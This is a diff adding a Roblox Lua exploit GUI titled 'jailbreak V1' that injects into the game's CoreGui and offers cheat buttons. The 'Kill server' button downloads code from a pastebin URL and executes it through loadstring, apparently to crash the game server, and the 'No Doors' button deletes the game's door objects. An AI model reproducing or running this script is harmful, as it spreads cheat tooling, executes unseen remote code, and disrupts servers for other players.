@@ -1,0 +1,133 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local jailbreakV1 = Instance.new("ScreenGui")
+local miscopen = Instance.new("Frame")
+local openmicbutton = Instance.new("TextButton")
+local miscstuff = Instance.new("Frame")
+local servercrasher = Instance.new("TextButton")
+local alapalkki = Instance.new("Frame")
+local alapalkinteksti = Instance.new("TextLabel")
+local nodoors = Instance.new("TextButton")
+local close = Instance.new("TextButton")
+
+--Properties:
+
+jailbreakV1.Name = "jailbreak V1"
+jailbreakV1.Parent = game.CoreGui
+
+miscopen.Name = "misc open"
+miscopen.Parent = jailbreakV1
+miscopen.Active = true
+miscopen.BackgroundColor3 = Color3.fromRGB(126, 0, 94)
+miscopen.BorderSizePixel = 0
+miscopen.Position = UDim2.new(0, 0, 0.341523349, 0)
+miscopen.Size = UDim2.new(0, 70, 0, 45)
+
+openmicbutton.Name = "open mic button"
+openmicbutton.Parent = miscopen
+openmicbutton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+openmicbutton.BackgroundTransparency = 0.250
+openmicbutton.BorderSizePixel = 0
+openmicbutton.Position = UDim2.new(0.100000001, 0, 0.111111112, 0)
+openmicbutton.Size = UDim2.new(0, 55, 0, 35)
+openmicbutton.Font = Enum.Font.GothamBold
+openmicbutton.Text = "Misc"
+openmicbutton.TextColor3 = Color3.fromRGB(154, 0, 115)
+openmicbutton.TextSize = 14.000
+openmicbutton.MouseButton1Down:connect(function()
+miscstuff.Visible = true
+miscopen.Visible = false
+end)
+
+miscstuff.Name = "misc stuff"
+miscstuff.Parent = jailbreakV1
+miscstuff.Active = true
+miscstuff.BackgroundColor3 = Color3.fromRGB(121, 0, 91)
+miscstuff.BorderSizePixel = 0
+miscstuff.Position = UDim2.new(0.456018507, 0, 0.29852581, 0)
+miscstuff.Size = UDim2.new(0, 450, 0, 200)
+miscstuff.Visible = false
+miscstuff.Draggable = true
+
+servercrasher.Name = "server crasher"
+servercrasher.Parent = miscstuff
+servercrasher.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+servercrasher.BackgroundTransparency = 0.500
+servercrasher.BorderSizePixel = 0
+servercrasher.Position = UDim2.new(0.733333349, 0, 0.720000029, 0)
+servercrasher.Size = UDim2.new(0, 100, 0, 40)
+servercrasher.Font = Enum.Font.GothamBold
+servercrasher.Text = "Kill server"
+servercrasher.TextColor3 = Color3.fromRGB(0, 0, 0)
+servercrasher.TextSize = 14.000
+servercrasher.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/ZihUjBxh", true))()
+end)
+
+alapalkki.Name = "alapalkki"
+alapalkki.Parent = miscstuff
+alapalkki.Active = true
+alapalkki.BackgroundColor3 = Color3.fromRGB(81, 0, 60)
+alapalkki.BorderSizePixel = 0
+alapalkki.Position = UDim2.new(0, 0, 1, 0)
+alapalkki.Size = UDim2.new(0, 450, 0, 40)
+
+alapalkinteksti.Name = "alapalkin teksti"
+alapalkinteksti.Parent = alapalkki
+alapalkinteksti.Active = true
+alapalkinteksti.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+alapalkinteksti.BackgroundTransparency = 1.000
+alapalkinteksti.BorderSizePixel = 0
+alapalkinteksti.Position = UDim2.new(0.277777791, 0, 0, 0)
+alapalkinteksti.Size = UDim2.new(0, 200, 0, 40)
+alapalkinteksti.Font = Enum.Font.GothamBold
+alapalkinteksti.Text = "Gui maded by L1R1 Discord: https://discord.gg/XrSeGNJ"
+alapalkinteksti.TextColor3 = Color3.fromRGB(0, 0, 0)
+alapalkinteksti.TextSize = 14.000
+
+nodoors.Name = "no doors"
+nodoors.Parent = miscstuff
+nodoors.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+nodoors.BackgroundTransparency = 0.500
+nodoors.Position = UDim2.new(0.466666669, 0, 0.720000029, 0)
+nodoors.Size = UDim2.new(0, 100, 0, 40)
+nodoors.Font = Enum.Font.GothamBold
+nodoors.Text = "No Doors"
+nodoors.TextColor3 = Color3.fromRGB(0, 0, 0)
+nodoors.TextSize = 14.000
+nodoors.MouseButton1Down:connect(function()
+	for i,v in pairs(workspace:GetDescendants()) do
+		if v.Name == "SwingDoor" then
+			v:Destroy() -- destroys the doors >:)
+		end
+	end
+	print("[Peepx0]: Successfully destroyed all SwingDoors!")
+	for i,v in pairs(workspace:GetDescendants()) do
+		if v.Name == "Door" then
+			v:Destroy()
+		end
+	end
+	for i,v in pairs(workspace:GetDescendants()) do
+		if v.Name == "SlideDoor" then
+			v:Destroy()
+		end
+	end
+end)
+
+close.Name = "close"
+close.Parent = miscstuff
+close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+close.BackgroundTransparency = 1.000
+close.Position = UDim2.new(0.455555558, 0, 0, 0)
+close.Size = UDim2.new(0, 40, 0, 40)
+close.Font = Enum.Font.GothamBold
+close.Text = "X"
+close.TextColor3 = Color3.fromRGB(0, 0, 0)
+close.TextSize = 20.000
+close.MouseButton1Down:connect(function()
+miscopen.Visible = true
+miscstuff.Visible = false
+end)
